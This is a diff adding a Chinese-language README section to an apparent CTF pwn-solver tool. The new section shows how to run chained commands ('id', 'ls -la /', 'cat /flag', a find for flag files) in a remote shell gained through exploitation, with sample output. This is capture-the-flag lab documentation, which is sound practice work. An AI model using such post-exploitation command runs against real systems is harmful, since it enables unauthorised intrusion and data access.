@@ -47,6 +47,21 @@ solve.bat pwn --host 1.2.3.4 --port 31337 --libc libc.so.6
 
 成功时会直接打印证据：`=> SHELL ret2win uid=1000(ctf)`。
 
+### 拿到 shell 后跑自己的命令
+
+```bat
+:: 一个 --cmd 一条命令，可重复
+solve.bat pwn --host 1.2.3.4 --port 31337 --ssl ^
+  --cmd "id" --cmd "ls -la /" --cmd "cat /flag" --cmd "find / -maxdepth 3 -name *flag* 2>/dev/null"
+```
+
+输出会把命令和回显单独列出来（同时写进 `results\<题>.json` 的 `cmds` 字段）：
+
+```
+    $ cat /flag
+      CTF2{...}
+```
+
 ### 远程 ≠ 本地的三个坑（引擎已处理 / 需你注意）
 
 | 坑 | 表现 | 处理 |
